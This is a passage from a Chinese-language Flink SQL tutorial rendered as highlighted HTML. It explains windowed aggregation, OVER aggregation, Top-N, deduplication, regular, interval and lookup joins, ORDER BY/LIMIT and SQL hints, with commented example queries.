class="keyword">GROUP</span> <span class="keyword">BY</span> window_start, window_end, <span class="keyword">id</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 滑动窗口</span></span><br><span class="line"><span class="comment"># 要求： 窗口长度=滑动步长的整数倍（底层会优化成多个小滚动窗口）</span></span><br><span class="line"><span class="keyword">SELECT</span> window_start, window_end, <span class="keyword">id</span> , <span class="keyword">SUM</span>(vc) sumVC</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">TABLE</span>(</span><br><span class="line">  HOP(<span class="keyword">TABLE</span> ws, <span class="keyword">DESCRIPTOR</span>(et), <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECONDS</span> , <span class="built_in">INTERVAL</span> <span class="string">'10'</span> <span class="keyword">SECONDS</span>))</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> window_start, window_end, <span class="keyword">id</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 累积窗口</span></span><br><span class="line"><span class="comment"># 累积窗口会在一定的统计周期内进行累积计算。累积窗口中有两个核心的参数：最大窗口长度（max window size）和累积步长（step）。</span></span><br><span class="line"><span class="comment"># 所谓的最大窗口长度其实就是我们所说的“统计周期”，最终目的就是统计这段时间内的数据</span></span><br><span class="line"><span class="comment"># 其实就是固定窗口间隔内提前触发的的滚动窗口 ，其实就是 Tumble Window + early-fire 的一个事件时间的版本。</span></span><br><span class="line"><span class="comment"># 例如，从每日零点到当前这一分钟绘制累积 UV，其中 10:00 时的 UV 表示从 00:00 到 10:00 的 UV 总数</span></span><br><span class="line"><span class="comment"># 累积窗口可以认为是首先开一个最大窗口大小的滚动窗口，然后根据用户设置的触发的时间间隔将这个滚动窗口拆分为多个窗口，这些窗口具有相同的窗口起点和不同的窗口终点</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意： 窗口最大长度 = 累积步长的整数倍</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">window_start, </span><br><span class="line">window_end, </span><br><span class="line"><span class="keyword">id</span> , </span><br><span class="line"><span class="keyword">SUM</span>(vc) sumVC</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">TABLE</span>(</span><br><span class="line">  CUMULATE(<span class="keyword">TABLE</span> ws, <span class="keyword">DESCRIPTOR</span>(et), <span class="built_in">INTERVAL</span> <span class="string">'2'</span> <span class="keyword">SECONDS</span> , <span class="built_in">INTERVAL</span> <span class="string">'6'</span> <span class="keyword">SECONDS</span>))</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> window_start, window_end, <span class="keyword">id</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## grouping sets多维分析</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">window_start, </span><br><span class="line">window_end, </span><br><span class="line"><span class="keyword">id</span> , </span><br><span class="line"><span class="keyword">SUM</span>(vc) sumVC</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">TABLE</span>(</span><br><span class="line">  TUMBLE(<span class="keyword">TABLE</span> ws, <span class="keyword">DESCRIPTOR</span>(et), <span class="built_in">INTERVAL</span> <span class="string">'5'</span> <span class="keyword">SECONDS</span>))</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> window_start, window_end,</span><br><span class="line"><span class="keyword">rollup</span>( (<span class="keyword">id</span>) )</span><br><span class="line"><span class="comment">--  cube( (id) )</span></span><br><span class="line"><span class="comment">--  grouping sets( (id),()  )</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><h3 id="5-7-Over-聚合">5.7 Over 聚合</h3><p>OVER聚合为一系列有序行的每个输入行计算一个聚合值。与GROUP BY聚合相比，OVER聚合不会将每个组的结果行数减少为一行。相反，OVER聚合为每个输入行生成一个聚合值。可以在事件时间或处理时间，以及指定为时间间隔、或行计数的范围内，定义Over windows</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 语法</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">  agg_func(agg_col) <span class="keyword">OVER</span> (</span><br><span class="line">    [<span class="keyword">PARTITION</span> <span class="keyword">BY</span> col1[, col2, ...]]</span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span> time_col</span><br><span class="line">    range_definition),</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">FROM</span> ...</span><br><span class="line"><span class="comment"># ORDER BY：必须是时间戳列（事件时间、处理时间），只能升序</span></span><br><span class="line"><span class="comment"># PARTITION BY：标识了聚合窗口的聚合粒度</span></span><br><span class="line"><span class="comment"># range_definition：这个标识聚合窗口的聚合数据范围，在 Flink 中有两种指定数据范围的方式。第一种为按照行数聚合，第二种为按照时间区间聚合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 举例</span></span><br><span class="line"><span class="comment"># 按照时间区间聚合</span></span><br><span class="line"><span class="comment"># 统计每个传感器前10秒到现在收到的水位数据条数</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">id</span>, </span><br><span class="line">    et, </span><br><span class="line">    vc,</span><br><span class="line">    <span class="keyword">count</span>(vc) <span class="keyword">OVER</span> (</span><br><span class="line">        <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">id</span></span><br><span class="line">        <span class="keyword">ORDER</span> <span class="keyword">BY</span> et</span><br><span class="line">        <span class="keyword">RANGE</span> <span class="keyword">BETWEEN</span> <span class="built_in">INTERVAL</span> <span class="string">'10'</span> <span class="keyword">SECOND</span> <span class="keyword">PRECEDING</span> <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="keyword">ROW</span></span><br><span class="line">  ) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用WINDOW子句来在SELECT外部单独定义一个OVER窗口,可以多次使用</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">id</span>, </span><br><span class="line">    et, </span><br><span class="line">    vc,</span><br><span class="line"><span class="keyword">count</span>(vc) <span class="keyword">OVER</span> w <span class="keyword">AS</span> cnt,</span><br><span class="line"><span class="keyword">sum</span>(vc) <span class="keyword">OVER</span> w <span class="keyword">AS</span> sumVC</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">id</span></span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span> et</span><br><span class="line">    <span class="keyword">RANGE</span> <span class="keyword">BETWEEN</span> <span class="built_in">INTERVAL</span> <span class="string">'10'</span> <span class="keyword">SECOND</span> <span class="keyword">PRECEDING</span> <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="keyword">ROW</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照行数聚合</span></span><br><span class="line"><span class="comment"># 统计每个传感器前5条到现在数据的平均水位</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">id</span>, </span><br><span class="line">    et, </span><br><span class="line">    vc,</span><br><span class="line">    <span class="keyword">avg</span>(vc) <span class="keyword">OVER</span> (</span><br><span class="line">      <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">id</span></span><br><span class="line">      <span class="keyword">ORDER</span> <span class="keyword">BY</span> et</span><br><span class="line">      <span class="keyword">ROWS</span> <span class="keyword">BETWEEN</span> <span class="number">5</span> <span class="keyword">PRECEDING</span> <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="keyword">ROW</span></span><br><span class="line">) <span class="keyword">AS</span> avgVC</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="comment"># 也可以用WINDOW子句来在SELECT外部单独定义一个OVER窗口</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">id</span>, </span><br><span class="line">    et, </span><br><span class="line">    vc,</span><br><span class="line"><span class="keyword">avg</span>(vc) <span class="keyword">OVER</span> w <span class="keyword">AS</span> avgVC,</span><br><span class="line"><span class="keyword">count</span>(vc) <span class="keyword">OVER</span> w <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">id</span></span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span> et</span><br><span class="line">    <span class="keyword">ROWS</span> <span class="keyword">BETWEEN</span> <span class="number">5</span> <span class="keyword">PRECEDING</span> <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="keyword">ROW</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="5-8-特殊语法-——-TOP-N">5.8 特殊语法 —— TOP-N</h3><p>目前在Flink SQL中没有能够直接调用的TOP-N函数，而是提供了稍微复杂些的变通实现方法，是固定写法，特殊支持的over用法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 语法</span></span><br><span class="line"><span class="keyword">SELECT</span> [column_list]</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line"><span class="keyword">SELECT</span> [column_list],</span><br><span class="line">ROW_NUMBER() <span class="keyword">OVER</span> ([<span class="keyword">PARTITION</span> <span class="keyword">BY</span> col1[, col2...]]</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> col1 [<span class="keyword">asc</span>|<span class="keyword">desc</span>][, col2 [<span class="keyword">asc</span>|<span class="keyword">desc</span>]...]) <span class="keyword">AS</span> <span class="keyword">rownum</span></span><br><span class="line"><span class="keyword">FROM</span> table_name)</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">rownum</span> &lt;= N [<span class="keyword">AND</span> conditions]</span><br><span class="line"><span class="comment"># ROW_NUMBER() ：标识 TopN 排序子句</span></span><br><span class="line"><span class="comment"># PARTITION BY col1[, col2...] ：标识分区字段，代表按照这个 col 字段作为分区粒度对数据进行排序取 topN，比如下述案例中的 partition by key ，就是根据需求中的搜索关键词（key）做为分区</span></span><br><span class="line"><span class="comment"># ORDER BY col1 [asc|desc][, col2 [asc|desc]...] ：标识 TopN 的排序规则，是按照哪些字段、顺序或逆序进行排序，可以不是时间字段，也可以降序（TopN特殊支持）</span></span><br><span class="line"><span class="comment"># WHERE rownum &lt;= N ：这个子句是一定需要的，只有加上了这个子句，Flink 才能将其识别为一个TopN 的查询，其中 N 代表 TopN 的条目数</span></span><br><span class="line"><span class="comment"># [AND conditions] ：其他的限制条件也可以加上</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    <span class="keyword">id</span>,</span><br><span class="line">    et,</span><br><span class="line">    vc,</span><br><span class="line">    <span class="keyword">rownum</span></span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> </span><br><span class="line">        <span class="keyword">id</span>,</span><br><span class="line">        et,</span><br><span class="line">        vc,</span><br><span class="line">        row_number() <span class="keyword">over</span>(</span><br><span class="line">            <span class="keyword">partition</span> <span class="keyword">by</span> <span class="keyword">id</span> </span><br><span class="line">            <span class="keyword">order</span> <span class="keyword">by</span> vc <span class="keyword">desc</span> </span><br><span class="line">        ) <span class="keyword">as</span> <span class="keyword">rownum</span></span><br><span class="line">    <span class="keyword">from</span> ws</span><br><span class="line">)</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">rownum</span>&lt;=<span class="number">3</span>;</span><br></pre></td></tr></table></figure><h3 id="5-9-特殊语法-——-Deduplication去重">5.9 特殊语法 —— Deduplication去重</h3><p>去重，也即上文介绍到的TopN 中** row_number = 1** 的场景，但是这里有一点不一样在于其<strong>排序字段一定是时间属性列，可以降序</strong>，不能是其他非时间属性的普通列。</p><p>在 row_number = 1 时，如果排序字段是普通列 planner 会翻译成 TopN 算子，如果是时间属性列 planner 会翻译成 Deduplication，这两者最终的执行算子是不一样的，Deduplication 相比 TopN 算子专门做了对应的优化，性能会有很大提升。可以从webui看出是翻译成哪种算子。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="keyword">SELECT</span> [column_list]</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line"><span class="keyword">SELECT</span> [column_list],</span><br><span class="line">ROW_NUMBER() <span class="keyword">OVER</span> ([<span class="keyword">PARTITION</span> <span class="keyword">BY</span> col1[, col2...]]</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> time_attr [<span class="keyword">asc</span>|<span class="keyword">desc</span>]) <span class="keyword">AS</span> <span class="keyword">rownum</span></span><br><span class="line"><span class="keyword">FROM</span> table_name)</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">rownum</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 案例</span></span><br><span class="line"><span class="comment"># 对每个传感器的水位值去重</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    <span class="keyword">id</span>,</span><br><span class="line">    et,</span><br><span class="line">    vc,</span><br><span class="line">    <span class="keyword">rownum</span></span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> </span><br><span class="line">        <span class="keyword">id</span>,</span><br><span class="line">        et,</span><br><span class="line">        vc,</span><br><span class="line">        row_number() <span class="keyword">over</span>(</span><br><span class="line">            <span class="keyword">partition</span> <span class="keyword">by</span> <span class="keyword">id</span>,vc </span><br><span class="line">            <span class="keyword">order</span> <span class="keyword">by</span> et </span><br><span class="line">        ) <span class="keyword">as</span> <span class="keyword">rownum</span></span><br><span class="line">    <span class="keyword">from</span> ws</span><br><span class="line">)</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="5-10-联结（Join）查询">5.10 联结（Join）查询</h3><p>Flink SQL中的联结查询大体上也可以分为两类：SQL原生的联结查询方式，和流处理中特有的联结查询</p><h4 id="常规联结查询">常规联结查询</h4><p>常规联结（Regular Join）是SQL中原生定义的Join方式，是最通用的一类联结操作。它的具体语法与标准SQL的联结完全相同，通过关键字JOIN来联结两个表，后面用关键字ON来指明联结条件。与标准SQL一致，Flink SQL的常规联结也可以分为内联结（INNER JOIN）和外联结（OUTER JOIN），区别在于结果中是否包含不符合联结条件的行。Regular Join 包含以下几种（以 L 作为左流中的数据标识， R 作为右流中的数据标识）：</p><ul><li>Inner Join（Inner Equal Join）：流任务中，只有两条流 Join 到才输出，输出 +[L, R]</li><li>Left Join（Outer Equal Join）：流任务中，左流数据到达之后，无论有没有 Join 到右流的数据，都会输出（Join 到输出 +[L, R] ，没 Join 到输出 +[L, null] ），如果右流之后数据到达之后，发现左流之前输出过没有 Join 到的数据，则会发起回撤流，先输出 -[L, null] ，然后输出 +[L, R]</li><li>Right Join（Outer Equal Join）：有 Left Join 一样，左表和右表的执行逻辑完全相反</li><li>Full Join（Outer Equal Join）：流任务中，左流或者右流的数据到达之后，无论有没有 Join 到另外一条流的数据，都会输出（对右流来说：Join 到输出 +[L, R] ，没 Join 到输出 +[null, R] ；对左流来说：Join 到输出 +[L, R] ，没 Join 到输出 +[L, null] ）。如果一条流的数据到达之后，发现之前另一条流之前输出过没有 Join 到的数据，则会发起回撤流（左流数据到达为例：回撤 -[null, R] ，输出+[L, R] ，右流数据到达为例：回撤 -[L, null] ，输出 +[L, R]</li></ul><p>Regular Join 的注意事项：</p><ul><li>实时 Regular Join 可以不是 等值 join 。等值 join 和 非等值 join 区别在于， 等值 join数据 shuffle 策略是 Hash，会按照 Join on 中的等值条件作为 id 发往对应的下游； 非等值 join 数据 shuffle 策略是 Global，所有数据发往一个并发，按照非等值条件进行关联</li><li>流的上游是无限的数据，所以要做到关联的话，Flink 会将两条流的所有数据都存储在 State 中，所以 Flink 任务的 State 会无限增大，因此你需要为 State 配置合适的 TTL，以防止 State 过大。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 再准备一张表用于join</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> ws1 (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">INT</span>,</span><br><span class="line">  vc <span class="built_in">INT</span>,</span><br><span class="line">  pt <span class="keyword">AS</span> PROCTIME(), <span class="comment">--处理时间</span></span><br><span class="line">  et <span class="keyword">AS</span> <span class="keyword">cast</span>(<span class="keyword">CURRENT_TIMESTAMP</span> <span class="keyword">as</span> <span class="built_in">timestamp</span>(<span class="number">3</span>)), <span class="comment">--事件时间</span></span><br><span class="line">  WATERMARK <span class="keyword">FOR</span> et <span class="keyword">AS</span> et - <span class="built_in">INTERVAL</span> <span class="string">'0.001'</span> <span class="keyword">SECOND</span>   <span class="comment">--watermark</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'datagen'</span>,</span><br><span class="line">  <span class="string">'rows-per-second'</span> = <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'fields.id.min'</span> = <span class="string">'3'</span>,</span><br><span class="line">  <span class="string">'fields.id.max'</span> = <span class="string">'5'</span>,</span><br><span class="line">  <span class="string">'fields.vc.min'</span> = <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'fields.vc.max'</span> = <span class="string">'100'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 等值内联结（INNER Equi-JOIN）</span></span><br><span class="line"><span class="comment"># 内联结用INNER JOIN来定义，会返回两表中符合联接条件的所有行的组合，也就是所谓的笛卡尔积（Cartesian product）。目前仅支持等值联结条件</span></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> ws1</span><br><span class="line"><span class="keyword">ON</span> ws.id = ws1.id;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 等值外联结（OUTER Equi-JOIN）</span></span><br><span class="line"><span class="comment"># Flink SQL支持左外（LEFT JOIN）、右外（RIGHT JOIN）和全外（FULL OUTER JOIN），分别表示会将左侧表、右侧表以及双侧表中没有任何匹配的行返回。</span></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> ws1</span><br><span class="line"><span class="keyword">ON</span> ws.id = ws1.id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> ws1</span><br><span class="line"><span class="keyword">ON</span> ws.id = ws1.id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> ws1</span><br><span class="line"><span class="keyword">ON</span> ws.id = ws1.id;</span><br></pre></td></tr></table></figure><h4 id="间隔联结查询">间隔联结查询</h4><p>两条流的Join就对应着SQL中两个表的Join，这是流处理中特有的联结方式。目前Flink SQL还不支持窗口联结，而间隔联结则已经实现。间隔联结（Interval Join）返回的，同样是符合约束条件的两条中数据的笛卡尔积。只不过这里的“约束条件”除了常规的联结条件外，还多了一个时间间隔的限制。具体语法有以下要点：</p><ul><li><strong>两表的联结</strong></li></ul><p>间隔联结不需要用JOIN关键字，直接在FROM后将要联结的两表列出来就可以，用逗号分隔。这与标准SQL中的语法一致，表示一个“交叉联结”（Cross Join），会返回两表中所有行的笛卡尔积</p><ul><li><strong>联结条件</strong></li></ul><p>联结条件用WHERE子句来定义，用一个等值表达式描述。交叉联结之后再用WHERE进行条件筛选，效果跟内联结INNER JOIN … ON …非常类似</p><ul><li><strong>时间间隔限制</strong></li></ul><p>我们可以在WHERE子句中，联结条件后用AND追加一个时间间隔的限制条件；做法是提取左右两侧表中的时间字段，然后用一个表达式来指明两者需要满足的间隔限制。具体定义方式有下面三种，这里分别用ltime和rtime表示左右表中的时间字段：</p><p>（1）ltime = rtime</p><p>（2）ltime &gt;= rtime AND ltime &lt; rtime + INTERVAL ‘10’ MINUTE</p><p>（3）ltime BETWEEN rtime - INTERVAL ‘10’ SECOND AND rtime + INTERVAL ‘5’ SECOND</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws,ws1</span><br><span class="line"><span class="keyword">WHERE</span> ws.id = ws1. <span class="keyword">id</span></span><br><span class="line"><span class="keyword">AND</span> ws.et <span class="keyword">BETWEEN</span> ws1.et - <span class="built_in">INTERVAL</span> <span class="string">'2'</span> <span class="keyword">SECOND</span> <span class="keyword">AND</span> ws1.et + <span class="built_in">INTERVAL</span> <span class="string">'2'</span> <span class="keyword">SECOND</span></span><br></pre></td></tr></table></figure><h4 id="维表联结查询">维表联结查询</h4><p>Lookup Join 其实就是维表 Join，实时获取外部缓存的 Join，Lookup 的意思就是实时查找。上面说的这几种 Join 都是流与流之间的 Join，而 Lookup Join 是流与 Redis，Mysql，HBase 这种外部存储介质的 Join。仅支持处理时间字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">表A</span><br><span class="line">JOIN 维度表名 FOR SYSTEM_TIME AS OF 表A.proc_time AS 别名</span><br><span class="line">ON xx.字段=别名.字段</span><br><span class="line"></span><br><span class="line"><span class="comment">## 比如维表在mysql，维表join的写法如下</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Customers (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">INT</span>,</span><br><span class="line">  <span class="keyword">name</span> <span class="keyword">STRING</span>,</span><br><span class="line">  country <span class="keyword">STRING</span>,</span><br><span class="line">  zip <span class="keyword">STRING</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'jdbc'</span>,</span><br><span class="line">  <span class="string">'url'</span> = <span class="string">'jdbc:mysql://hadoop102:3306/customerdb'</span>,</span><br><span class="line">  <span class="string">'table-name'</span> = <span class="string">'customers'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- order表每来一条数据，都会去mysql的customers表查找维度数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> o.order_id, o.total, c.country, c.zip</span><br><span class="line"><span class="keyword">FROM</span> Orders <span class="keyword">AS</span> o</span><br><span class="line">  <span class="keyword">JOIN</span> Customers <span class="keyword">FOR</span> SYSTEM_TIME <span class="keyword">AS</span> <span class="keyword">OF</span> o.proc_time <span class="keyword">AS</span> c</span><br><span class="line">    <span class="keyword">ON</span> o.customer_id = c.id;</span><br></pre></td></tr></table></figure><h3 id="5-11-Order-by-和-limit">5.11 Order by 和 limit</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 支持 Batch\Streaming，但在实时任务中一般用的非常少</span></span><br><span class="line"><span class="comment">## 实时任务中，Order By 子句中必须要有时间属性字段，并且必须写在最前面且为升序</span></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> et, <span class="keyword">id</span> <span class="keyword">desc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="5-12-SQL-Hints">5.12 SQL Hints</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在执行查询时，可以在表名后面添加SQL Hints来临时修改表属性，对当前job生效</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> ws1<span class="comment">/*+ OPTIONS('rows-per-second'='10')*/</span>;</span><br></pre></td></tr></table></figure><h3 id="5-13-集合操作">5.13 集合操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 